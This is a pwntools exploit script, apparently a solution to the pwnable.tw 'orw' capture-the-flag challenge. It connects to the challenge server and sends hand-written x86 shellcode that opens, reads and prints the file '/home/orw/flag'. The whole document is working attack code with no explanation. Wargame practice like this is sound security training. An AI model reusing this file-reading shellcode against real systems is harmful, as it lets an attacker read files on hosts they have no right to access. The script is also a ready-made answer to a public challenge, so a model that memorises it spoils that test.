from pwn import *

e = ELF("./orw")

context.binary = e
context.terminal = ["konsole", "-e"]

#p = process([e.path])
p = remote("chall.pwnable.tw", 10001)


context.log_level="debug"
#gdb.attach(p, """break * 0x804858a\nc""")



sc_addr = 0x0804a060

print("sc_addr", hex(sc_addr))



p.recvuntil(":")




sc = asm("""
    mov eax, 0x5
    mov ebx, 0x0804a100
    mov ecx, 0x0
    mov edx, 0x0
    int 0x80
    
    push eax
    mov eax, 0x3
    pop ebx
    mov ecx, 0x0804a100
    mov edx, 0x30
    int 0x80
    
    mov eax, 0x4
    mov ebx, 0x1
    mov ecx, 0x0804a100
    mov edx, 0x30
    int 0x80
""")


sc = sc.ljust(160)
sc += "/home/orw/flag"


print("sc len", len(sc))




p.send(sc)




p.interactive()
